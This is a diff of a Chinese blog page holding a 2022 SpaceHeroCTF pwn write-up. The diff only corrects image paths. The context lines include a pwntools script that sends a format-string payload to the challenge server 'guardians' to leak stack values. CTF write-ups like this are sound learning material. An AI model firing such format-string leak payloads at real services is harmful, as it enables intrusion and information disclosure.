@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="welc0me">
 <meta property="og:description" content="2022 spaceheroCTF（shctf）有关pwn的writeup。相关附件我放在链接">
 <meta property="og:locale">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//QQ%E5%9B%BE%E7%89%8720220404160511.jpg">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/04/SpaceHeroCTF2022-pwn-wp/QQ%E5%9B%BE%E7%89%8720220404160511.jpg">
 <meta property="article:published_time" content="2022-04-04T07:41:17.000Z">
 <meta property="article:modified_time" content="2022-04-04T08:08:04.000Z">
 <meta property="article:author" content="nich0las">
@@ -30,7 +30,7 @@
 <meta property="article:tag" content="stack">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//QQ%E5%9B%BE%E7%89%8720220404160511.jpg">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/2022/04/04/SpaceHeroCTF2022-pwn-wp/QQ%E5%9B%BE%E7%89%8720220404160511.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -309,7 +309,7 @@
 <span id="more"></span>
 
 <p>松神AK re太强了，海伟哥单砍高分pwn题太强了，我啥也不会，太菜了！！！！要多多努力！！！！</p>
-<p><img src="/.io//QQ%E5%9B%BE%E7%89%8720220404160511.jpg" alt="QQ图片20220404160511"></p>
+<p><img src="/2022/04/04/SpaceHeroCTF2022-pwn-wp/QQ%E5%9B%BE%E7%89%8720220404160511.jpg" alt="QQ图片20220404160511"></p>
 <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="guardians-of-galaxy"><a href="#guardians-of-galaxy" class="headerlink" title="guardians of galaxy"></a>guardians of galaxy</h2><p>白给x64格式化字符串</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./guardians&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>,<span class="number">12690</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1302&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Does Quill manage to win the dance battle?&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
